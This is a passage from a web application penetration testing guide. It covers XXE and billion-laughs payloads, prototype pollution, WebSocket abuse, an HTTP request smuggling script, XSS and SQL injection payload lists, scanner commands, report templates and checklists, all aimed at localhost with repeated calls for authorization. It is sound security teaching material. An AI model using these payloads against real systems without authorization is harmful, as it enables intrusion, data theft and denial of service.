  --data @xxe.xml

# Test 2: SSRF via XXE
cat > xxe_ssrf.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:6379/">
]>
<root>
  <data>&xxe;</data>
</root>
EOF

curl -X POST http://localhost:3000/api/parse-xml \
  -H "Content-Type: application/xml" \
  --data @xxe_ssrf.xml

# Test 3: Billion Laughs (DoS)
cat > billion_laughs.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
EOF

curl -X POST http://localhost:3000/api/parse-xml \
  -H "Content-Type: application/xml" \
  --data @billion_laughs.xml

# Expected: XXE disabled, external entities blocked
# Vulnerable if: File contents or SSRF successful
```

### Attack 30: Deserialization Attacks

**Node.js Specific**:
```javascript
// deserialization_test.js
const axios = require('axios');

// Test 1: Modify serialized object
const maliciousPayload = {
  username: 'attacker',
  isAdmin: true,
  __proto__: {
    isAdmin: true
  }
};

axios.post('http://localhost:3000/api/data', maliciousPayload)
  .then(r => console.log('Response:', r.data))
  .catch(e => console.log('Blocked:', e.message));

// Test 2: Prototype pollution
const pollutionPayload = JSON.stringify({
  "__proto__": {
    "isAdmin": true
  }
});

axios.post('http://localhost:3000/api/update', 
  pollutionPayload,
  { headers: { 'Content-Type': 'application/json' } }
)
  .then(r => console.log('Pollution attempt:', r.data))
  .catch(e => console.log('Blocked:', e.message));
```

### Attack 31: WebSocket Security

**If using WebSocket**:
```javascript
// websocket_test.js
const WebSocket = require('ws');

// Test 1: Unauthenticated access
const ws1 = new WebSocket('ws://localhost:3000/socket');

ws1.on('open', () => {
  console.log('✗ VULNERABLE: WebSocket accepts unauthenticated connections');
  ws1.send(JSON.stringify({ type: 'admin_command', action: 'deleteAll' }));
});

// Test 2: XSS via WebSocket
const ws2 = new WebSocket('ws://localhost:3000/socket');

ws2.on('open', () => {
  ws2.send(JSON.stringify({ 
    message: '<script>alert("XSS")</script>' 
  }));
});

// Test 3: Message flooding
const ws3 = new WebSocket('ws://localhost:3000/socket');

ws3.on('open', () => {
  for (let i = 0; i < 10000; i++) {
    ws3.send(JSON.stringify({ spam: 'data' }));
  }
});

// Expected: Authentication required, rate limiting, input sanitization
// Vulnerable if: Commands execute without proper validation
```

### Attack 32: HTTP Request Smuggling

**Advanced Test**:
```python
# request_smuggling.py
import socket

host = 'localhost'
port = 3000

# CL.TE attack (Content-Length vs Transfer-Encoding)
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(payload.encode())
response = s.recv(4096)
print(response.decode())
s.close()

# Expected: Proper handling of conflicting headers
# Vulnerable if: Requests processed incorrectly
```

---

## Automated Testing Tools

### Tool 1: OWASP ZAP Automation

**ZAP Automated Scan**:
```bash
# Install OWASP ZAP
docker pull owasp/zap2docker-stable

# Quick scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000 \
  -r zap_report.html

# Full scan
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t http://localhost:3000 \
  -r zap_full_report.html

# API scan
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t http://localhost:3000/api/openapi.json \
  -f openapi \
  -r zap_api_report.html

# Authenticated scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \
  zap-full-scan.py -t http://localhost:3000 \
  -z "-config api.disablekey=true -config scanner.strength=INSANE" \
  -r zap_auth_report.html
```

### Tool 2: Nikto Web Scanner

```bash
# Install Nikto
git clone https://github.com/sullo/nikto
cd nikto/program

# Basic scan
./nikto.pl -h http://localhost:3000

# SSL scan
./nikto.pl -h https://localhost:3000 -ssl

# Comprehensive scan with all plugins
./nikto.pl -h http://localhost:3000 -Plugins '@@ALL' -output nikto_report.html

# Specific tests
./nikto.pl -h http://localhost:3000 -Tuning 123456789

# Tuning options:
# 1 - Interesting files
# 2 - Misconfiguration
# 3 - Information disclosure
# 4 - Injection
# 5 - Remote file retrieval
# 6 - Denial of service
# 7 - Remote file retrieval
# 8 - Command execution
# 9 - SQL injection
```

### Tool 3: SQLMap for NoSQL

```bash
# Install SQLMap
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# Test for NoSQL injection
python sqlmap.py -u "http://localhost:3000/api/users?id=1" \
  --level=5 --risk=3 --tamper=space2comment --batch

# Test with POST data
python sqlmap.py -u "http://localhost:3000/api/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 --batch

# Test with authentication
python sqlmap.py -u "http://localhost:3000/api/search?q=test" \
  --cookie="sessionId=YOUR_SESSION" \
  --level=5 --risk=3 --batch

# Enumerate databases
python sqlmap.py -u "http://localhost:3000/api/users?id=1" \
  --dbs --level=5 --risk=3 --batch
```

### Tool 4: Nuclei Scanner

```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Basic scan
nuclei -u http://localhost:3000

# Scan with specific templates
nuclei -u http://localhost:3000 -t cves/
nuclei -u http://localhost:3000 -t vulnerabilities/
nuclei -u http://localhost:3000 -t exposures/

# Custom severity
nuclei -u http://localhost:3000 -severity critical,high

# Output to file
nuclei -u http://localhost:3000 -o nuclei_results.txt

# JSON output
nuclei -u http://localhost:3000 -json -o nuclei_results.json
```

### Tool 5: Custom Automated Testing Suite

```python
# automated_security_test.py
import requests
import json
from datetime import datetime

class SecurityTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.results = []
        
    def test_xss(self):
        """Test for XSS vulnerabilities"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for payload in payloads:
            try:
                response = requests.get(
                    f"{self.base_url}/search",
                    params={'q': payload},
                    timeout=5
                )
                
                if payload in response.text:
                    self.add_result('XSS', 'VULNERABLE', f'Payload reflected: {payload}')
                else:
                    self.add_result('XSS', 'SAFE', f'Payload escaped: {payload}')
            except Exception as e:
                self.add_result('XSS', 'ERROR', str(e))
    
    def test_sql_injection(self):
        """Test for SQL/NoSQL injection"""
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "1' UNION SELECT NULL--",
            {"$ne": None},
            {"$gt": ""}
        ]
        
        for payload in payloads:
            try:
                if isinstance(payload, dict):
                    response = requests.post(
                        f"{self.base_url}/api/login",
                        json={'username': payload, 'password': payload},
                        timeout=5
                    )
                else:
                    response = requests.post(
                        f"{self.base_url}/api/login",
                        json={'username': payload, 'password': 'test'},
                        timeout=5
                    )
                
                if response.status_code == 200:
                    self.add_result('SQL Injection', 'VULNERABLE', f'Payload succeeded: {payload}')
                else:
                    self.add_result('SQL Injection', 'SAFE', f'Payload blocked: {payload}')
            except Exception as e:
                self.add_result('SQL Injection', 'ERROR', str(e))
    
    def test_auth_bypass(self):
        """Test authentication bypass"""
        tests = [
            ('No token', None),
            ('Invalid token', 'invalid.token.here'),
            ('Expired token', 'expired.token.here')
        ]
        
        for test_name, token in tests:
            try:
                headers = {}
                if token:
                    headers['Authorization'] = f'Bearer {token}'
                
                response = requests.get(
                    f"{self.base_url}/api/admin/users",
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    self.add_result('Auth Bypass', 'VULNERABLE', f'{test_name}: Access granted')
                else:
                    self.add_result('Auth Bypass', 'SAFE', f'{test_name}: Access denied')
            except Exception as e:
                self.add_result('Auth Bypass', 'ERROR', str(e))
    
    def test_rate_limiting(self):
        """Test rate limiting"""
        url = f"{self.base_url}/api/login"
        blocked = False
        
        for i in range(50):
            try:
                response = requests.post(
                    url,
                    json={'username': 'test', 'password': 'wrong'},
                    timeout=5
                )
                
                if response.status_code == 429:
                    blocked = True
                    self.add_result('Rate Limiting', 'SAFE', f'Blocked after {i+1} requests')
                    break
            except Exception as e:
                self.add_result('Rate Limiting', 'ERROR', str(e))
                break
        
        if not blocked:
            self.add_result('Rate Limiting', 'VULNERABLE', 'No rate limiting detected')
    
    def test_security_headers(self):
        """Test security headers"""
        required_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        
        try:
            response = requests.get(self.base_url, timeout=5)
            
            for header in required_headers:
                if header in response.headers:
                    self.add_result('Security Headers', 'SAFE', f'{header}: {response.headers[header]}')
                else:
                    self.add_result('Security Headers', 'VULNERABLE', f'Missing: {header}')
        except Exception as e:
            self.add_result('Security Headers', 'ERROR', str(e))
    
    def add_result(self, test_type, status, details):
        """Add test result"""
        self.results.append({
            'timestamp': datetime.now().isoformat(),
            'test_type': test_type,
            'status': status,
            'details': details
        })
        print(f"[{status}] {test_type}: {details}")
    
    def run_all_tests(self):
        """Run all security tests"""
        print(f"\n{'='*60}")
        print(f"Security Testing Suite - {self.base_url}")
        print(f"{'='*60}\n")
        
        self.test_xss()
        print()
        self.test_sql_injection()
        print()
        self.test_auth_bypass()
        print()
        self.test_rate_limiting()
        print()
        self.test_security_headers()
        
        self.generate_report()
    
    def generate_report(self):
        """Generate test report"""
        print(f"\n{'='*60}")
        print("Security Test Report")
        print(f"{'='*60}\n")
        
        vulnerable_count = sum(1 for r in self.results if r['status'] == 'VULNERABLE')
        safe_count = sum(1 for r in self.results if r['status'] == 'SAFE')
        error_count = sum(1 for r in self.results if r['status'] == 'ERROR')
        
        print(f"Total Tests: {len(self.results)}")
        print(f"Vulnerable: {vulnerable_count}")
        print(f"Safe: {safe_count}")
        print(f"Errors: {error_count}")
        
        # Save to file
        with open('security_test_report.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\nDetailed report saved to: security_test_report.json")

# Run tests
if __name__ == '__main__':
    tester = SecurityTester('http://localhost:3000')
    tester.run_all_tests()
```

---

## Documentation & Reporting

### Creating Vulnerability Reports

**Template**:
```markdown
# Security Vulnerability Report

**Date**: 2025-01-07
**Application**: Your App Name
**Version**: 1.0.0
**Tester**: Your Name

## Executive Summary
Brief overview of findings and risk level.

## Findings

### 1. [CRITICAL] SQL Injection in Login Endpoint

**Vulnerability Type**: Injection
**CVSS Score**: 9.8
**Affected Endpoint**: POST /api/login
**Risk Level**: Critical

**Description**:
The login endpoint is vulnerable to SQL injection attacks through the username parameter.

**Steps to Reproduce**:
1. Navigate to login page
2. Enter username: `' OR '1'='1`
3. Enter any password
4. Submit form
5. Access granted without valid credentials

**Evidence**:
```bash
curl -X POST http://localhost:3000/api/login \
  -d "username=' OR '1'='1&password=anything"
# Response: 200 OK with admin token
```

**Impact**:
- Unauthorized access to any account
- Data breach potential
- Complete system compromise

**Remediation**:
1. Use parameterized queries
2. Implement input validation
3. Use ORM with built-in protection

**Recommended Fix**:
```javascript
// Before (Vulnerable)
const query = `SELECT * FROM users WHERE username='${username}'`;

// After (Secure)
const query = 'SELECT * FROM users WHERE username = ?';
db.execute(query, [username]);
```

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

### 2. [HIGH] Cross-Site Scripting in Search

[Continue with similar format for each vulnerability]

## Summary Statistics

| Severity | Count |
|----------|-------|
| Critical | 2     |
| High     | 5     |
| Medium   | 8     |
| Low      | 3     |
| Info     | 7     |

## Recommendations

1. Implement comprehensive input validation
2. Enable security headers
3. Add rate limiting
4. Regular security audits
5. Security training for developers

## Next Steps

1. Address critical vulnerabilities immediately
2. Create patching timeline for high/medium issues
3. Schedule re-testing after fixes
4. Implement security monitoring
```

### Risk Assessment Matrix

```
        Impact →
        Low    Medium    High    Critical
     ┌───────┬─────────┬───────┬─────────┐
Low  │ Low   │ Low     │ Medium│ Medium  │
     ├───────┼─────────┼───────┼─────────┤
Med  │ Low   │ Medium  │ High  │ High    │
Prob ├───────┼─────────┼───────┼─────────┤
High │ Medium│ High    │ High  │Critical │
     ├───────┼─────────┼───────┼─────────┤
Crit │ Medium│ High    │Critical│Critical│
     └───────┴─────────┴───────┴─────────┘
```

---

## Best Practices for Security Testing

### 1. Testing Methodology

**Follow OWASP Testing Guide**:
1. Information Gathering
2. Configuration Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. Error Handling Testing
9. Cryptography Testing
10. Business Logic Testing
11. Client-Side Testing

### 2. Test Environment Setup

```bash
# Always test on isolated environment
# 1. Clone production
# 2. Use test database
# 3. Separate network
# 4. Document everything

# Docker compose for testing environment
version: '3.8'
services:
  test-app:
    build: .
    environment:
      - NODE_ENV=testing
      - DATABASE_URL=mongodb://test-db:27017/testdb
    ports:
      - "4000:3000"
  
  test-db:
    image: mongo:latest
    ports:
      - "27018:27017"
```

### 3. Documentation Standards

- Document every test performed
- Include steps to reproduce
- Capture evidence (screenshots, logs)
- Note date and time
- Track fixed vulnerabilities
- Maintain testing checklist

### 4. Legal Considerations

**Before Testing**:
- ✅ Get written permission
- ✅ Define scope clearly
- ✅ Set testing boundaries
- ✅ Agree on testing timeframe
- ✅ Establish communication protocol
- ✅ Plan for incident response
- ❌ Never test without authorization
- ❌ Never test third-party dependencies
- ❌ Never cause actual damage

### 5. Testing Schedule

**Weekly**:
- Dependency vulnerability scan
- Automated security tests in CI/CD

**Monthly**:
- Manual penetration testing
- Review security logs
- Update testing tools

**Quarterly**:
- Comprehensive security audit
- Third-party penetration test
- Security training updates

**Annually**:
- Full security assessment
- Architecture review
- Compliance audit

---

## Quick Reference Checklists

### Pre-Testing Checklist

- [ ] Written authorization obtained
- [ ] Test environment configured
- [ ] Backup created
- [ ] Testing tools installed
- [ ] Scope documented
- [ ] Team notified
- [ ] Incident response plan ready

### Authentication Testing Checklist

- [ ] Password strength requirements
- [ ] Brute force protection
- [ ] Account lockout mechanism
- [ ] Password reset security
- [ ] Session management
- [ ] Multi-factor authentication
- [ ] OAuth implementation
- [ ] JWT security
- [ ] Cookie security flags

### API Security Checklist

- [ ] Authentication required
- [ ] Authorization enforced
- [ ] Rate limiting implemented
- [ ] Input validation
- [ ] Output encoding
- [ ] CORS properly configured
- [ ] API versioning
- [ ] Error messages sanitized
- [ ] Mass assignment protection

### Data Security Checklist

- [ ] Encryption at rest
- [ ] Encryption in transit (HTTPS)
- [ ] Sensitive data not logged
- [ ] PII properly handled
- [ ] Database credentials secured
- [ ] Key management implemented
- [ ] Backup encryption
- [ ] Data retention policy

### Infrastructure Checklist

- [ ] Security headers configured
- [ ] SSL/TLS properly configured
- [ ] Firewall rules defined
- [ ] Unnecessary services disabled
- [ ] Regular updates applied
- [ ] Monitoring enabled
- [ ] Logging configured
- [ ] Secrets management

---

## Emergency Response

### If You Find a Critical Vulnerability

1. **Stop testing immediately**
2. **Document the vulnerability**
3. **Notify security team**
4. **Don't exploit further**
5. **Don't share publicly**
6. **Help with remediation**

### Incident Response Steps

```bash
# 1. Isolate affected system
sudo systemctl stop nginx
sudo iptables -A INPUT -j DROP

# 2. Preserve evidence
sudo tar -czf evidence-$(date +%Y%m%d-%H%M%S).tar.gz /var/log/

# 3. Document timeline
echo "$(date): Vulnerability discovered" >> incident.log

# 4. Notify stakeholders
# Send notification with severity and impact

# 5. Begin remediation
git checkout -b security-fix-$(date +%Y%m%d)
```

---

## Additional Resources

### Books
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Hacking APIs" by Corey J. Ball
- "Real-World Bug Hunting" by Peter Yaworski

### Websites
- OWASP.org - Security testing guide
- PortSwigger.net/web-security - Free academy
- HackerOne.com - Bug bounty platform
- BugCrowd.com - Vulnerability disclosure
- PentesterLab.com - Hands-on exercises

### Tools Repository
```bash
# Clone security tools
git clone https://github.com/OWASP/Amass.git
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/sullo/nikto.git
git clone https://github.com/commixproject/commix.git
git clone https://github.com/beefproject/beef.git
```

### Practice Platforms
- **DVWA** (Damn Vulnerable Web Application)
- **OWASP Juice Shop**
- **WebGoat**
- **HackTheBox**
- **TryHackMe**
- **PentesterLab**

### Setting Up Practice Environment

```bash
# Install DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Install Juice Shop
docker run --rm -p 3000:3000 bkimminich/juice-shop

# Install WebGoat
docker run -p 8080:8080 -p 9090:9090 webgoat/goatandwolf

# Access at:
# DVWA: http://localhost
# Juice Shop: http://localhost:3000
# WebGoat: http://localhost:8080/WebGoat
```

---

## Testing Workflow Summary

### Phase 1: Reconnaissance (1-2 days)
- Identify technologies used
- Map application structure
- Find entry points
- Document APIs
- Review source code (if available)

### Phase 2: Automated Scanning (1 day)
- Run OWASP ZAP
- Run Nikto
- Run Nuclei
- Dependency scanning
- Analyze results

### Phase 3: Manual Testing (3-5 days)
- Authentication testing
- Authorization testing
- Input validation
- Business logic
- API security
- Session management

### Phase 4: Advanced Testing (2-3 days)
- Exploit development
- Chain vulnerabilities
- Test fixes
- Retest critical issues

### Phase 5: Reporting (1-2 days)
- Document findings
- Create PoC exploits
- Write recommendations
- Present to team
- Track remediation

---

## Continuous Security Testing

### CI/CD Integration

```yaml
# .github/workflows/security.yml
name: Security Testing

on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run npm audit
        run: npm audit --audit-level=high
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'MyApp'
          path: '.'
          format: 'HTML'
      
      - name: Security Headers Check
        run: |
          npm install -g npm-check-updates
          ncu --doctor --packageManager npm
      
      - name: Static Analysis
        run: |
          npm install -g eslint
          eslint . --ext .js,.jsx,.ts,.tsx
```

---

## Final Notes

### Remember:
1. ⚠️ **Always get written permission before testing**
2. 🎯 **Test in isolated environments**
3. 📝 **Document everything thoroughly**
4. 🔒 **Handle findings responsibly**
5. 🚫 **Never cause actual damage**
6. 📚 **Keep learning continuously**
7. 🤝 **Collaborate with security team**
8. ⚡ **Respond to findings promptly**

### Key Principles:
- **Defense in Depth**: Multiple layers of security
- **Least Privilege**: Minimum necessary access
- **Fail Securely**: Errors don't expose vulnerabilities
- **Security by Design**: Built-in from the start
- **Assume Breach**: Plan for compromise

### Success Metrics:
- Vulnerabilities found and fixed
- Security posture improvement
- Incident response time
- Team security awareness
- Compliance achievement

---

## Getting Started Today

```bash
# 1. Set up your test environment
git clone your-app.git test-app
cd test-app
cp .env .env.test
# Edit .env.test with test database

# 2. Install testing tools
npm install -g snyk
brew install nikto nmap

# 3. Run first scan
npm audit
snyk test

# 4. Manual testing
# Start with OWASP Top 10
# Follow this guide step by step

# 5. Document findings
touch security-findings.md
# Use template from Documentation section

# 6. Fix and retest
git checkout -b security-fixes
# Apply fixes
# Retest to verify

# 7. Continuous improvement
# Schedule regular testing
# Update testing procedures
# Train team on findings
```

---

**Last Updated**: January 2025
**Version**: 1.0
**Maintained By**: Your Security Team

---

## Contributing

Found a new attack vector? Have improvements? 

1. Document the attack thoroughly
2. Provide working PoC
3. Include detection methods
4. Add remediation steps
5. Submit for review

---

## Support & Questions

For questions about this guide:
- Review OWASP documentation
- Check security forums
- Consult with security team
- Practice on intentionally vulnerable apps first

---

**Remember: With great power comes great responsibility. Use this knowledge ethically and legally.**

---

## Quick Command Reference

```bash
# Port Scanning
nmap -sV -sC localhost

# SSL Testing
testssl.sh https://localhost:3000

# Directory Bruteforce
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt

# Subdomain Enumeration
sublist3r -d yourdomain.com

# Web Crawler
wget --spider --recursive http://localhost:3000

# Header Analysis
curl -I http://localhost:3000

# Response Time Analysis
for i in {1..100}; do curl -w "%{time_total}\n" -o /dev/null -s http://localhost:3000; done

# Cookie Analysis
curl -c cookies.txt -b cookies.txt http://localhost:3000

# POST Data Fuzzing
wfuzz -c -z file,wordlist.txt -d "username=FUZZ&password=test" http://localhost:3000/login

# JSON Fuzzing
echo '{"test":"FUZZ"}' | radamsa | curl -X POST -d @- http://localhost:3000/api
```

---

*This guide is for educational and ethical security testing purposes only. Always obtain proper authorization before testing any system.*